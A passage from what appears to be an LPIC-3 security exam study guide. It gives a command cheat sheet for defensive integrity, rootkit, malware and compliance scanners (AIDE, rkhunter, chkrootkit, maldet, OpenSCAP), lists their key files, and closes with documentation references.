| AIDE: check | `aide --check` |
| AIDE: check + re-baseline | `aide --update` (**never** from cron) |
| rkhunter: update signatures | `rkhunter --update` |
| rkhunter: re-baseline properties | `rkhunter --propupd` (**only** after a verified change) |
| rkhunter: scan | `rkhunter --check --sk --rwo` |
| chkrootkit: quiet scan | `chkrootkit -q` |
| chkrootkit: offline/trusted | `chkrootkit -r /mnt/victim -p /mnt/trusted/bin` |
| maldet: update signatures | `maldet -u` |
| maldet: scan a path | `maldet -a /var/www/html` |
| maldet: scan recent files | `maldet -r /var/www 2` |
| maldet: real-time monitor | `maldet --monitor /var/www` |
| maldet: view report / restore | `maldet --report <SCANID>` / `maldet --restore <file>` |
| oscap: inspect content | `oscap info <ds.xml>` |
| oscap: evaluate a profile | `oscap xccdf eval --profile <id> --results-arf a.xml --report r.html <ds.xml>` |
| oscap: generate remediation | `oscap xccdf generate fix --fix-type ansible --profile <id> -o fix.yml <ds.xml>` |
| oscap: CVE scan | `oscap oval eval --report v.html <vendor-oval.xml>` |
| oscap: scan a container image | `oscap-podman <image> xccdf eval --profile <id> ...` |

**Key files:** `/etc/audit/auditd.conf`, `/etc/audit/audit.rules`, `/etc/audit/rules.d/*.rules`, `/etc/audit/plugins.d/*.conf`, `/etc/audit/audisp-remote.conf`, `/var/log/audit/audit.log`, `/etc/aide.conf` (or `/etc/aide/aide.conf`), `/var/lib/aide/aide.db.gz`, `/etc/rkhunter.conf` + `/etc/rkhunter.conf.local`, `/var/lib/rkhunter/db/`, `/var/log/rkhunter.log`, `/usr/local/maldetect/conf.maldet`, `/usr/share/xml/scap/ssg/content/ssg-*-ds.xml`.

---

## 10. Referencias

**Exam objectives**
- LPI Exam 303 Objectives (303-300, v3.0) — https://www.lpi.org/our-certifications/exam-303-objectives/
- LPIC-3 Security certification overview — https://www.lpi.org/our-certifications/lpic-3-security-overview/

**Linux Audit subsystem**
- Linux Audit project (userspace) — https://github.com/linux-audit/audit-userspace
- Linux Audit documentation wiki — https://github.com/linux-audit/audit-documentation/wiki
- `auditd(8)` — https://man7.org/linux/man-pages/man8/auditd.8.html
- `auditd.conf(5)` — https://man7.org/linux/man-pages/man5/auditd.conf.5.html
- `auditctl(8)` — https://man7.org/linux/man-pages/man8/auditctl.8.html
- `audit.rules(7)` — https://man7.org/linux/man-pages/man7/audit.rules.7.html
- `ausearch(8)` — https://man7.org/linux/man-pages/man8/ausearch.8.html
- `aureport(8)` — https://man7.org/linux/man-pages/man8/aureport.8.html
- `autrace(8)` — https://man7.org/linux/man-pages/man8/autrace.8.html
- `audisp-remote(8)` — https://man7.org/linux/man-pages/man8/audisp-remote.8.html
- `pam_tty_audit(8)` — https://man7.org/linux/man-pages/man8/pam_tty_audit.8.html
- Red Hat Enterprise Linux 9 — Auditing the system — https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/9/html/security_hardening/auditing-the-system_security-hardening

**File integrity monitoring**
- AIDE project — https://aide.github.io/
- AIDE manual and `aide.conf` reference — https://aide.github.io/doc/
- AIDE source repository — https://github.com/aide/aide
- Linux kernel Integrity Measurement Architecture (IMA/EVM) — https://www.kernel.org/doc/html/latest/security/IMA-templates.html
- fs-verity — https://www.kernel.org/doc/html/latest/filesystems/fsverity.html

**Rootkit and malware detection**
- chkrootkit — https://www.chkrootkit.org/
- Rootkit Hunter (rkhunter) — https://rkhunter.sourceforge.net/
- Linux Malware Detect (LMD) — https://www.rfxn.com/projects/linux-malware-detect/
- LMD source repository — https://github.com/rfxn/linux-malware-detect
- ClamAV documentation — https://docs.clamav.net/
- `unhide` — https://github.com/YJesus/Unhide

**Compliance and configuration assessment**
- OpenSCAP project — https://www.open-scap.org/
- OpenSCAP User Manual — https://static.open-scap.org/openscap-1.3/oscap_user_manual.html
- ComplianceAsCode / SCAP Security Guide — https://github.com/ComplianceAsCode/content
- NIST Security Content Automation Protocol (SCAP) — https://csrc.nist.gov/projects/security-content-automation-protocol
- NIST SP 800-126 (SCAP 1.3 technical specification) — https://csrc.nist.gov/publications/detail/sp/800-126/rev-3/final
- CIS Benchmarks — https://www.cisecurity.org/cis-benchmarks
- DISA STIGs — https://public.cyber.mil/stigs/
- Red Hat — Scanning the system for configuration compliance and vulnerabilities — https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/9/html/security_hardening/scanning-the-system-for-configuration-compliance-and-vulnerabilities_security-hardening

**Automation and platform integration**
- `systemd.timer(5)` — https://www.freedesktop.org/software/systemd/man/systemd.timer.html
- `systemd.exec(5)` (sandboxing directives) — https://www.freedesktop.org/software/systemd/man/systemd.exec.html
- `crontab(5)` — https://man7.org/linux/man-pages/man5/crontab.5.html
- Kubernetes — Auditing — https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- Falco (runtime security, eBPF) — https://falco.org/docs/
- fapolicyd (application allowlisting) — https://github.com/linux-application-whitelisting/fapolicyd
- Fluent Bit documentation — https://docs.fluentbit.io/manual

**Regulatory drivers**
- PCI DSS (Requirements 10 and 11.5) — https://www.pcisecuritystandards.org/document_library/
- NIST SP 800-53 Rev. 5 (AU, SI control families) — https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final